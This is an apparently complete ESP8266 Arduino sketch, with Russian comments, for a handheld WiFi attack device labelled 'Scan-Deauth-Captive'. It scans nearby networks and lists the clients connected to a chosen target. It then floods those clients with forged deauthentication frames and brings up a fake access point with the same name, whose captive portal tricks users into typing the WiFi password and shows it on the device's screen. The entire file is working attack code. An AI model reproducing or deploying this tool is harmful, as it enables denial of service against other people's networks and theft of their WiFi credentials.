#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <vector>

// OLED и кнопки
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C
#define SCROLL_BUTTON_PIN D5
#define SELECT_BUTTON_PIN D6

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// DNS и веб-сервер
DNSServer dnsServer;
ESP8266WebServer server(80);
const byte DNS_PORT = 53;
String capturedPassword = "";

struct NetworkInfo {
    String ssid;
    String bssid;
    int32_t rssi;
    int channel;
};

// Переменные интерфейса
std::vector<NetworkInfo> networks;
int currentNetworkIndex = 0;
const int networksPerPage = 5;
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;
int menuSelection = 0;
bool isAttackMode = false;

// Переменные атаки
uint8_t target_bssid[6];
uint8_t target_channel;
String target_ssid;
std::vector<String> knownClients;
bool isScanningClients = false;
bool hasDeauthed = false;
bool hasPrintedClients = false;
bool fakeApStarted = false;
unsigned long clientScanStart = 0;

// Константы атаки
static const uint32_t CLIENT_SCAN_TIME = 10000;
static const uint8_t NUM_ROUNDS = 10;
static const uint16_t DEAUTH_DELAY_MS = 1000;
static const uint16_t ROUND_DELAY_MS = 1000;

// Структуры для промискуитетного режима
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

// Обработчики веб-сервера для Captive Portal
void handleCaptivePortal() {
    String html = R"rawliteral(
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>WiFi Login</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 20px; }
                input { margin: 10px; padding: 5px; }
            </style>
        </head>
        <body>
            <h2>Enter WiFi Password</h2>
            <form action="/submit" method="POST">
                <input type="password" name="wifi_pass" placeholder="Password" required>
                <input type="submit" value="Connect">
            </form>
        </body>
        </html>
    )rawliteral";
    server.send(200, "text/html", html);
}

void handleSubmit() {
    capturedPassword = server.arg("wifi_pass");
    
    // Показываем захваченный пароль на дисплее
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    display.println("Password captured:");
    display.println(capturedPassword);
    display.display();
    
    // Отправляем ответ
    server.send(200, "text/html", "<html><body><h2>Connecting...</h2></body></html>");
}

void startFakeAP() {
    wifi_promiscuous_enable(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
    delay(200);

    // Запуск фейковой точки доступа
    WiFi.mode(WIFI_AP);
    WiFi.softAP(target_ssid.c_str());
    
    // Настройка DNS и веб-сервера
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    server.on("/", handleCaptivePortal);
    server.on("/hotspot-detect.html", handleCaptivePortal);
    server.on("/generate_204", handleCaptivePortal);
    server.on("/submit", HTTP_POST, handleSubmit);
    server.onNotFound(handleCaptivePortal);
    server.begin();
    
    // Обновление дисплея
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    display.println("Fake AP Started");
    display.println(target_ssid);
    display.println(WiFi.softAPIP().toString());
    display.display();
    
    fakeApStarted = true;
}

bool sendDeauthPacket(const uint8_t *clientMAC) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Deauth
        0x00, 0x00, // Duration
        0,0,0,0,0,0, // Dest
        0,0,0,0,0,0, // Source
        0,0,0,0,0,0, // BSSID
        0x00, 0x00, // Seq
        0x07, 0x00  // Reason code 7
    };

    memcpy(&deauthPacket[4],  clientMAC,    6);
    memcpy(&deauthPacket[10], target_bssid, 6);
    memcpy(&deauthPacket[16], target_bssid, 6);

    return (wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0);
}

void startAttack() {
    NetworkInfo& net = networks[currentNetworkIndex];
    
    // Конвертация BSSID
    sscanf(net.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);
    
    target_channel = net.channel;
    target_ssid = net.ssid;
    
    knownClients.clear();
    isScanningClients = true;
    hasDeauthed = false;
    hasPrintedClients = false;
    fakeApStarted = false;
    clientScanStart = millis();
    
    // Настройка промискуитетного режима
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    wifi_set_channel(target_channel);
    
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
        if (!isScanningClients) return;
        if (len < 12 + sizeof(wifi_ieee80211_mac_hdr_t)) return;

        auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
        auto *hdr = &packet->hdr;
        
        if (memcmp(hdr->addr3, target_bssid, 6) == 0 &&
            memcmp(hdr->addr2, target_bssid, 6) != 0) {
            
            char mac[18];
            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                    hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
            String clientMac = String(mac);
            
            if (std::find(knownClients.begin(), knownClients.end(), 
                         clientMac) == knownClients.end()) {
                knownClients.push_back(clientMac);
            }
        }
    });
    
    wifi_promiscuous_enable(true);
    
    // Обновление дисплея
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    display.println("Scanning clients...");
    display.display();
}

void handleAttack() {
    if (isScanningClients && millis() - clientScanStart >= CLIENT_SCAN_TIME) {
        isScanningClients = false;
        wifi_promiscuous_enable(false);
        
        display.clearDisplay();
        display.setCursor(0,0);
        display.printf("Found %d clients\n", knownClients.size());
        display.display();
        delay(1000);
        
        if (!knownClients.empty() && !hasDeauthed) {
            display.clearDisplay();
            display.setCursor(0,0);
            display.println("Sending deauth...");
            display.display();
            
            wifi_promiscuous_enable(true);
            
            // Отправка deauth-пакетов
            for (uint8_t round = 1; round <= NUM_ROUNDS; round++) {
                for (auto &clientMac : knownClients) {
                    uint8_t mac[6];
                    sscanf(clientMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
                    sendDeauthPacket(mac);
                    delay(DEAUTH_DELAY_MS);
                }
                
                display.clearDisplay();
                display.setCursor(0,0);
                display.printf("Round %d/%d\n", round, NUM_ROUNDS);
                display.display();
                
                delay(ROUND_DELAY_MS);
            }
            
            wifi_promiscuous_enable(false);
            hasDeauthed = true;
            
            // Запуск фейковой точки доступа
            startFakeAP();
        } else if (!hasDeauthed) {
            display.clearDisplay();
            display.setCursor(0,0);
            display.println("No clients found");
            display.println("Starting Fake AP...");
            display.display();
            delay(1000);
            
            hasDeauthed = true;
            startFakeAP();
        }
    }
}

void initDisplay() {
    if(!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
        Serial.println(F("SSD1306 allocation failed"));
        for(;;);
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.display();
}

void scanNetworks() {
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("Scanning...");
    display.display();

    networks.clear();
    int n = WiFi.scanNetworks();
    
    if (n > 0) {
        for (int i = 0; i < n; ++i) {
            NetworkInfo network;
            network.ssid = WiFi.SSID(i);
            network.bssid = WiFi.BSSIDstr(i);
            network.rssi = WiFi.RSSI(i);
            network.channel = WiFi.channel(i);
            networks.push_back(network);
        }
        
        // Сортировка по уровню сигнала (от сильного к слабому)
        std::sort(networks.begin(), networks.end(), 
            [](const NetworkInfo& a, const NetworkInfo& b) {
                return a.rssi > b.rssi;
            });
    }
    currentNetworkIndex = 0;
}

void displayNetworkDetails() {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    
    // Информация о сети
    NetworkInfo& net = networks[currentNetworkIndex];
    display.println(net.ssid);
    display.printf("RSSI: %d dBm\n", net.rssi);
    display.printf("Ch: %d\n", net.channel);
    display.println(net.bssid);
    
    // Разделительная линия
    display.drawLine(0, 33, SCREEN_WIDTH-1, 33, SSD1306_WHITE);
    
    // Опции с четким выделением текущего выбора
    display.setCursor(0, 40);
    if (menuSelection == 0) { // Attack выбран
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.print("> Attack");
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 50);
        display.print("  Back");
    } else { // Back выбран
        display.setTextColor(SSD1306_WHITE);
        display.print("  Attack");
        display.setCursor(0, 50);
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.print("> Back");
    }
    
    display.display();
}

void handleButtons() {
    if (millis() - lastDebounceTime < debounceDelay) return;
    
    if (digitalRead(SCROLL_BUTTON_PIN) == LOW) {
        lastDebounceTime = millis();
        
        if (isAttackMode) {
            // Переключение между Attack и Back
            menuSelection = !menuSelection;
            displayNetworkDetails();
        } else {
            // Переключение между сетями
            currentNetworkIndex = (currentNetworkIndex + 1) % networks.size();
            displayNetworks();
        }
    }
    
    if (digitalRead(SELECT_BUTTON_PIN) == LOW) {
        lastDebounceTime = millis();
        
        if (!isAttackMode) {
            // Вход в режим атаки
            isAttackMode = true;
            menuSelection = 0; // Сбрасываем выбор на Attack
            displayNetworkDetails();
        } else {
            // Обработка выбора в меню
            if (menuSelection == 0) { // Attack
                startAttack();
            } else { // Back
                isAttackMode = false;
                displayNetworks();
            }
        }
    }
}

void displayNetworks() {
    display.clearDisplay();
    
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    display.println("Scan-Deauth-Captive");
    
    int totalPages = (networks.size() + networksPerPage - 1) / networksPerPage;
    int currentPage = (currentNetworkIndex / networksPerPage) + 1;
    display.printf("Page: %d/%d\n", currentPage, totalPages);
    
    display.drawLine(0, 20, SCREEN_WIDTH-1, 20, SSD1306_WHITE);
    
    int startIdx = (currentNetworkIndex / networksPerPage) * networksPerPage;
    int endIdx = min(startIdx + networksPerPage, (int)networks.size());
    
    for (int i = startIdx; i < endIdx; i++) {
        display.setCursor(0, 24 + (i - startIdx) * 8);
        if (i == currentNetworkIndex) {
            display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        display.println(networks[i].ssid);
    }
    
    display.display();
}

void setup() {
    Serial.begin(115200);
    
    pinMode(SCROLL_BUTTON_PIN, INPUT_PULLUP);
    pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
    
    initDisplay();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    scanNetworks();
    displayNetworks();
}

void loop() {
    // Обработка DNS и веб-сервера для Captive Portal
    if (fakeApStarted) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
    
    handleButtons();
    
    if (isScanningClients || hasDeauthed) {
        handleAttack();
    }
    
    // Обновление списка сетей
    static unsigned long lastScanTime = 0;
    if (!isAttackMode && !isScanningClients && !fakeApStarted && 
        millis() - lastScanTime > 30000) {
        scanNetworks();
        displayNetworks();
        lastScanTime = millis();
    }
}
